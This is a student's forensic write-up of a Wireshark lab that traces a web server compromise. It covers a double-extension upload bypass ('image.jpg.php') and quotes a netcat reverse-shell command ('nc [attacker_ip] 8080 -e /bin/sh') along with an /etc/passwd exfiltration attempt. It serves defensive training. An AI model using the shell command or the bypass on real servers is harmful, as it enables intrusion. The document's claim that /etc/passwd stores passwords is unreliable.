# Summary

This lab focused on investigating a suspected web server compromise using Wireshark to analyze a captured PCAP file. Through network traffic inspection, I identified that the attack originated from **Tianjin, China**, where the attacker exploited a **file upload vulnerability** to deploy a **malicious PHP web shell (`image.jpg.php`)**. The attacker later attempted to establish a **reverse shell connection on port 8080** and **exfiltrate sensitive system data (`/etc/passwd`)** using command-line tools such as **netcat** and **curl**. The analysis demonstrated how a simple upload bypass can lead to remote code execution and data exposure. This exercise strengthened my understanding of **network forensics, attack chain analysis, and incident reporting** — key skills for a Security Operations Center (SOC) or Cybersecurity Analyst role.

# Aim of the Lab

---

Analyze network traffic using Wireshark to investigate a web server compromise, identify web shell deployment, reverse shell communication, and data exfiltration.

# Objective

---

**Learning objective**

- **Capture and filter network traffic** relevant to HTTP/HTTPS and other communication protocols used in attacks.
- **Identify signs of malicious activity**, such as abnormal HTTP requests, file uploads, or command execution patterns consistent with web shell deployment.
- **Trace reverse shell connections**, recognizing attacker-controlled outbound communications and command-and-control behavior.
- **Detect data exfiltration attempts**, including unusual data transfers or encrypted outbound traffic.
- **Document and report findings**, articulating evidence of compromise and providing recommendations for mitigation.

# Scenario

---

A suspicious file was identified on a company web server, raising alarms within the intranet. The Development team flagged the anomaly, suspecting potential malicious activity. To address the issue, the network team captured critical network traffic and prepared a PCAP file for review.

Your task is to analyze the provided PCAP file to uncover how the file appeared and determine the extent of any unauthorized activity.

# Procedure

---

 1.Start the Lab by clicking on the “Start Lab Machine”. {You have to wait few minutes to boot it up}

1. Lets begin the lab by opening the Wireshark tool and analyze the Pcap(Packet Capture) file and check the first question.

<aside>
❓

1. Identifying the geographical origin of the attack facilitates the implementation of geo-blocking measures and the analysis of threat intelligence. From which city did the attack originate?

💡 Note: The lab machines do not have internet access. To look up the IP address and complete this step, use an IP geolocation service on your local computer outside the lab environment.

</aside>

1. The First Question basically ask to analyze from which city does this attack originate from? In order to find out the city from where the attack has originated is we have to look at the “Source IP Address” and use a “Third Party Service” which is “[IP geo location](https://ipgeolocation.io/)” to find out since that is how the attack started.
2. Copy the “Source IP Address” and then paste it on to the search bar of the ip geo location website, the results will be display that the IP originated from the Country “China” and State is “Tianjin” → This is the answer to the First Question.

<aside>
❓

1. Knowing the attacker's User-Agent assists in creating robust filtering rules. What's the attacker's Full User-Agent?
</aside>

5.The User-Agent basically displays what system is the attacker using which can appended in  the allow/deny lists to protect from future attack. In order to find out the User-Agent click a packet which contains the “HTTP” Protocol then on the “Packet Information Window” I observed that in the HTTP section There was “***User Agent”*** present which is 

![Screenshot 2025-10-28 at 7.18.53 PM.png](Experiment%207%20WebStrike%20Lab%20297c704c659681c5bebef80c8df5b1f7/Screenshot_2025-10-28_at_7.18.53_PM.png)

User- Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 → Answer to the Second Question.

<aside>
❓

1. We need to determine if any vulnerabilities were exploited. What is the name of the malicious web shell that was successfully uploaded?
</aside>

1. Malicious web shell in other words what malicious file was used to exploit the vulnerabilities, to find out in the Wireshark’s “search bar” type in the following filter “http.request.method ==POST” ( This will find the packets which used the POST method in the website)
2. There are total of 3 packets which used the “POST” method, I observed the first 2 packets which the info was written “/reviews/upload.php” follow the HTTP stream of the first packet (Ctrl+Alt+Shift+H) and observe the details.

![Screenshot 2025-10-28 at 7.27.56 PM.png](Experiment%207%20WebStrike%20Lab%20297c704c659681c5bebef80c8df5b1f7/Screenshot_2025-10-28_at_7.27.56_PM.png)

(Insert the FIrst Packet details image)

![Screenshot 2025-10-28 at 7.28.21 PM.png](Experiment%207%20WebStrike%20Lab%20297c704c659681c5bebef80c8df5b1f7/Screenshot_2025-10-28_at_7.28.21_PM.png)

1. I observed in the last section of the client side (Colored in Red) that the name of the file was “uploadedFile” and the file name is “image.php” now it is malicious file however if you see in the server side (Colored in Blue) The response was “Invalid file format” now that is great thing that it blocked the malicious file.

(Insert the second packet details image)

![Screenshot 2025-10-28 at 7.28.48 PM.png](Experiment%207%20WebStrike%20Lab%20297c704c659681c5bebef80c8df5b1f7/Screenshot_2025-10-28_at_7.28.48_PM.png)

1. However if we take a look the details of the second “POST” Packet that file name was changed from “image.php” to  “image.jpg.php” by which the server accepted the file bypassing the file upload restriction.
    
    The malicious file name is “image.jpg.php” → Answer to the Third Question.
    

<aside>
❓

1. Identifying the directory where uploaded files are stored is crucial for locating the vulnerable page and removing any malicious files. Which directory is used by the website to store the uploaded files?
</aside>

1. After the malicious file was uploaded it is an urgent matter to remove the file in order to stop from making more damage, in order to know where the file was uploaded I applied a certain filter which was “ip.src == <ipaddress> && http.request.method == GET” this will the return the specific “ malicious ip address” as the source and the method as “GET”

(insert the GET filter picture)

![Screenshot 2025-10-28 at 8.29.27 PM.png](Experiment%207%20WebStrike%20Lab%20297c704c659681c5bebef80c8df5b1f7/Screenshot_2025-10-28_at_8.29.27_PM.png)

1. I observed in the packet number “138” where the info was “ GET /reviews/uploads/image.jpg.php HTTP/1.1\r\n” as I know that the malicious file was “image.jpg.php”  it was uploaded in /reviews/uploads/ → Answer to the 4th question.

<aside>
❓

1. Which port, opened on the attacker's machine, was targeted by the malicious web shell for establishing unauthorized outbound communication?
</aside>

1. To know which port was opened, I simply went back to the packet where the method was “POST” and inspect the contents “image.jpg.php” ,there I saw that it used a netcat(nc) command with the ip address along with the port number “8080” hence this was the port number → Answer to the 5th question.

(insert the 8080 image) 

![Screenshot 2025-10-28 at 8.39.53 PM.png](Experiment%207%20WebStrike%20Lab%20297c704c659681c5bebef80c8df5b1f7/Screenshot_2025-10-28_at_8.39.53_PM.png)

<aside>
❓

1. Recognizing the significance of compromised data helps prioritize incident response actions. Which file was the attacker attempting to exfiltrate.
</aside>

1. Finally I need to recognize which file the attacker was trying to exfiltrate? In order to know I went again to the packets which contained the POST method, since I mentioned previously that there were 3 packets contained the method POST I followed the HTTP stream of the last packet from that the User-Agent was changed to “curl” which indicated that it was using the “curl” command from the “Terminal” and the command which was used is “/etc/passwd/.

![Screenshot 2025-10-28 at 8.46.35 PM.png](Experiment%207%20WebStrike%20Lab%20297c704c659681c5bebef80c8df5b1f7/4f299593-3bfa-41e1-8aa5-285be86d2e75.png)

In other words the attacker was trying to exfiltrate the “passwords” file which  is a critical target as it contains a list of system users and their associated configuration information which was stored in the server. Technically this where every Linux OS stores its passwords. 

This Concludes the Lab.

# Results

| # | Finding | Evidence (from Wireshark) | Conclusion |
| --- | --- | --- | --- |
| **1** | **Attack Origin** | Source IP address in HTTP traffic traced to **Tianjin, China** via IP geolocation lookup. | The attack originated from Tianjin, China. |
| **2** | **Attacker User-Agent** | `Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0` observed in HTTP request headers. | Attacker was using a **Linux-based system** with **Firefox browser**. |
| **3** | **Malicious Upload** | HTTP `POST /reviews/upload.php` request containing file **`image.jpg.php`**. | A **malicious PHP web shell** was successfully uploaded by bypassing file type restrictions. |
| **4** | **Upload Directory** | Subsequent request to **`/reviews/uploads/image.jpg.php`**. | The web shell was stored in the **`/reviews/uploads/`** directory. |
| **5** | **Reverse Shell Connection** | Payload contained command: `nc [attacker_ip] 8080 -e /bin/sh`. | The web shell attempted to establish a **reverse shell to port 8080** on the attacker’s system. |
| **6** | **Data Exfiltration Attempt** | HTTP request with User-Agent `curl` accessing **`/etc/passwd`**. | Attacker attempted to **exfiltrate sensitive system file** `/etc/passwd`. |

**Additional results**

---

- The attacker’s **first file upload attempt** (`image.php`) was rejected with an *“Invalid file format”* message.
    
    Shortly after, the attacker successfully uploaded **`image.jpg.php`**, indicating deliberate **bypass testing** of the server’s file validation controls.
    
- The use of **`nc` (netcat)** and **`curl`** commands in HTTP payloads confirms the attacker was operating from a **Linux environment** with direct terminal access — pointing toward a **manual exploitation** rather than an automated scanner.
- A clear **change in User-Agent** was observed:
    
    early requests used **Firefox**, while later ones used **`curl`**.
    
    This suggests the attacker switched from **browser-based reconnaissance** to **command-line exploitation** after gaining initial access.
    
- The **HTTP response codes** changed from `403 Forbidden` (upload blocked) to `200 OK` (upload accepted), confirming the moment when the attacker **successfully bypassed the file restriction**.
- The malicious file was stored in a **web-accessible uploads directory** (`/reviews/uploads/`).
    
    Such writable directories could be reused by the attacker to **plant additional backdoors** or establish **persistence**.
    
- The **reverse shell** was configured to connect on **port 8080**, a port commonly used for legitimate web traffic.
    
    This indicates a **stealth tactic** — blending malicious outbound traffic with normal HTTP activity to evade detection.
    
- The attacker used **plain HTTP** instead of HTTPS for communication.
    
    While this exposed their actions for analysis, it also indicates **weak operational security (OPSEC)** on the attacker’s side.
    
- The access to **`/etc/passwd`** suggests **system reconnaissance** — enumerating user accounts, not extracting password hashes (since `/etc/passwd` doesn’t contain them).
    
    This was likely a **preliminary information-gathering step** before escalation.
    
- The overall pattern — multiple upload attempts, environment probing, and reverse shell setup — indicates a **human-driven intrusion** rather than an automated bot.
    
    The attacker demonstrated **moderate technical skill** and **adaptability**.

| **Exfiltration** | Attempted read of `/etc/passwd` | T1041 – Exfiltration over Web Channel |

---

## **5. Impact Assessment**

- Successful upload of a **remote-access web shell**.
- Potential for **privilege escalation** and **system enumeration**.
- Attempted **exfiltration of sensitive system files**.
- High risk if not immediately remediated (persistence could be established).

---

## **6. Recommendations**

1. **Immediately remove** `image.jpg.php` from `/reviews/uploads/`.
2. **Patch upload functionality** to allow only specific MIME types and file extensions.
3. **Restrict outbound network traffic**, especially ports like `8080`.
4. **Deploy a Web Application Firewall (WAF)** to detect malicious uploads and encoded commands.
5. **Conduct credential rotation** for users potentially exposed via `/etc/passwd`.
6. **Monitor for further signs of C2 activity** or persistence (cron jobs, reverse tunnels, etc.).

---

## **7. Conclusion**

The investigation confirmed a **successful web shell upload** by an attacker originating from **Tianjin, China**. The actor leveraged an upload validation flaw to execute commands on the server and attempt data theft.

The compromise highlights the importance of **secure file handling**, **network monitoring**, and **access control** to prevent similar attacks in the future.
